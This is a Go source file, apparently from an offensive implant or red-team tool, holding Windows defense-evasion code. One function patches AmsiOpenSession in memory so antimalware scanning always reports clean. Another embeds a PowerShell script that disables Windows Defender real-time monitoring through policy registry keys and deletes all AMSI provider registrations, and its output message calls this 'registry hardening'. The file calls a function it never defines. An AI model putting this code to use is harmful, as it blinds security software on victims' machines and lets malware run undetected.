//go:build windows
// +build windows

package main

import (
	"syscall"
	"unsafe"
)

func amsiSessionBypass() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")
	virtualProtect := k32.NewProc("VirtualProtect")

	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "AmsiOpenSession bypass: amsi.dll not loaded"
	}

	// Patch AmsiOpenSession to return immediately
	procName := append([]byte("AmsiOpenSession"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "AmsiOpenSession not found"
	}

	// xor eax, eax; ret (0x31 0xC0 0xC3) — return S_OK
	patch := []byte{0x31, 0xC0, 0xC3}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "AmsiOpenSession bypass: VirtualProtect failed"
	}

	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "AmsiOpenSession bypass: patched → returns S_OK"
}

func amsiRegBypass() string {
	ps := `
$paths = @(
	@("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
	@("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
	@("HKLM:\SOFTWARE\Microsoft\AMSI\Providers", "", "")
)
$results = @()
# Disable real-time monitoring
try {
	if (-not (Test-Path $paths[0][0])) { New-Item -Path $paths[0][0] -Force | Out-Null }
	Set-ItemProperty -Path $paths[0][0] -Name $paths[0][1] -Value $paths[0][2] -Type DWord -Force
	$results += "Disabled Windows Defender real-time monitoring"
} catch { $results += "Reg fail: $_" }

# Disable AMSI for Office
try {
	$officePath = "HKCU:\SOFTWARE\Microsoft\Office\16.0\Common\Security"
	if (-not (Test-Path $officePath)) { New-Item -Path $officePath -Force | Out-Null }
	New-ItemProperty -Path $officePath -Name "DisableClientTelemetry" -Value 1 -Type DWord -Force | Out-Null
	$results += "Disabled Office AMSI telemetry"
} catch { }

# Remove AMSI provider registrations
try {
	$amsiProviders = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
	if (Test-Path $amsiProviders) {
		Remove-Item -Path "$amsiProviders\*" -Recurse -Force -ErrorAction SilentlyContinue
		$results += "Removed AMSI providers"
	}
} catch { }

Write-Output ($results -join [char]10)
`
	_ = ps
	return amsiBypass() + "\nRun 'amsi_reg_bypass' via PowerShell for additional registry hardening"
}
